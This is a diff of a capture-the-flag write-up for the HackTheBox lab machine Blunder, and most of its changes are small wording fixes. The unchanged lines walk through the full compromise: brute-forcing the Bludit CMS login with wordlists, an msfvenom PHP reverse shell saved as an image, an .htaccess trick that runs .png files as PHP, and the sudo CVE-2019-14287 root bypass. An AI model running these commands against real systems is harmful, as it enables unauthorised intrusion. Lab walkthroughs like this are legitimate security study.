@@ -14,21 +14,21 @@ Sticking with Linux for my next box from TJNull's [list of OSCP-like HackTheBox 
 
 ## Phase 1: Enumeration
 
-Step 1: Kick off [AutoRecon][autorecon]
+Step 1: Kick off [AutoRecon][autorecon] to enumerate external facing services.
 
 ```bash
 autorecon -o Blunder --single-target 10.10.10.191 
 ```
 
-While that was running I tried to browse to <http://10.10.10.191/> and found a simple CMS web server running. AutoRecon will kick off some content discovery, but I'll kick off my own for better coverage. Again I used `ffuf` because speeeeeeeeeed.
+While that was running I browsed to <http://10.10.10.191/> and found a simple CMS web server running. AutoRecon will kick off some content discovery, but I'll kick off my own for better coverage. Again I used `ffuf` because speeeeeeeeeed.
 
 ```bash
-ffuf -u http://10.10.10.191/FUZZ -e .php,.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -of csv -o medium.csv
+ffuf -u http://10.10.10.191/FUZZ -e .php,.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -of csv -o medium.csv
 ```
 
 A few interesting endpoints showed up in this scan.
 
-```txt
+```
 admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
 install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
 robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
@@ -37,16 +37,16 @@ todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
 
 `robots.txt` doesn't give me anything, but the rest of these endpoints are all useful. `todo.txt` contains an interesting TODO list that seems to hint that the application is using out-of-date CMS software, and also mentions a potential user ("fergus").
 
-```txt
+```
 -Update the CMS
 -Turn off FTP - DONE
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
 ```
 
-Checking out `install.php` gives me the name of the CMS software being used, Bludit.
+Checking out `install.php` gives the name of the CMS software being used, Bludit.
 
-```txt
+```
 Bludit is already installed ;)
 ```
 
@@ -56,7 +56,7 @@ Which is confirmed by visiting the `admin` endpoint, which displays a login form
 
 ## Phase 2: Getting Credentials
 
-Looking up Bludit in searchsploit reveals a few exploits, including a few RCE. However, all of the code execution exploits rely on having a valid username/password for the admin page. There is an "Auth Bruteforce Bypass" exploit that looks interesting, so lets take a look at that.
+Looking up Bludit in `searchsploit` reveals a few exploits, including a few RCE. However, all of the code execution exploits rely on having a valid username/password for the admin page. There is an "Auth Bruteforce Bypass" exploit that looks interesting, so lets take a look at that.
 
 ```bash
 ssp -x php/webapps/48942.py
@@ -167,13 +167,13 @@ with open(Username_list) as uf:
 
 I had to edit the exploit by adding the "save" variable to the post request (and fix the login loop), but this looks like its good to go otherwise.
 
-Here I made a mistake, I tried a few contextual passwords against the target ("bludit","blunder",etc.) but then I just launched `rockyou.txt` against it.
+I tried a few contextual passwords against the target ("bludit","blunder",etc.), but after those failed I just launched `rockyou.txt` against it.
 
 ```bash
 python3 auth.py -u fergus.txt -p /usr/share/seclists/Passwords/LeakedDatabases/rockyou.txt -l http://10.10.10.191/admin/login
 ```
 
-After an hour of waiting around, I realized that this couldn't be the intended solution. This actually taught me about a nifty tool that I had heard about in my OSCP prep, but never used, `cewl`. `cewl` is used for generating wordlists from applications, and is super simple to use. In this case, I generated a wordlist with the following command.
+After an hour of waiting around, I realized that this couldn't be the intended solution. This actually taught me about a nifty tool that I had heard about, but never used: `cewl`. `cewl` is used for generating wordlists from applications, and is super simple to use. In this case, I generated a wordlist with the following command.
 
 ```bash
 cewl http://10.10.10.191 > passlist
@@ -337,7 +337,7 @@ if __name__ == "__main__":
     upload_evil_image(url, cookie, token, payload2)
 ```
 
-The exploit requires us to make a PHP reverse shell that we are going to save as an image file. It handily gives us the commands to run as well.
+The exploit requires us to save a PHP reverse shell as an image file. It handily gives us the commands to run as well.
 
 ```bash
 msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -b '"' > shell.png
@@ -346,7 +346,7 @@ echo "RewriteEngine off" > .htaccess
 echo "AddType application/x-httpd-php .png" >> .htaccess
 ```
 
-With the prep work all done, all thats left is to run the exploit.
+With the prep work done, all thats left is to run the exploit.
 
 ```bash
 $ python3 rce.py
@@ -440,7 +440,7 @@ www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php
 }
 ```
 
-If we toss that hash into Google, we can see that it is the SHA-1 hash of "Password120". We can also see from `/etc/passwd` that Hugo is a user on this box.
+If we toss that hash into Google, we can see that it is the SHA-1 hash of "Password120". We can also see from the `/etc/passwd` file that Hugo is a user on this box.
 
 ```bash
 www-data@blunder:/var/www$ cat /etc/passwd
@@ -448,7 +448,7 @@ www-data@blunder:/var/www$ cat /etc/passwd
 hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
 ```
 
-Lets see if Hugo like to reuse passwords.
+Let's see if Hugo like to reuse passwords.
 
 ```bash
 www-data@blunder:/var/www$ su hugo
@@ -469,7 +469,7 @@ User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 ```
 
-The last line of this output means that we can run `/bin/bash` as any user *excpet* root. However, recently a `sudo` vulnerability (CVE-2019-14287) was published that expliclty allows us to bypass this exact scenario. The syntax for exploiting it is `sudo -u#-1 bash` so lets give that a go.
+The last line of this output means that we can run `/bin/bash` as any user *except* root. However, recently a `sudo` vulnerability (CVE-2019-14287) was published that expliclty allows us to bypass this exact scenario. The syntax for exploiting it is `sudo -u#-1 bash` so lets give that a go.
 
 ```bash
 hugo@blunder:~$ sudo -u#-1 bash
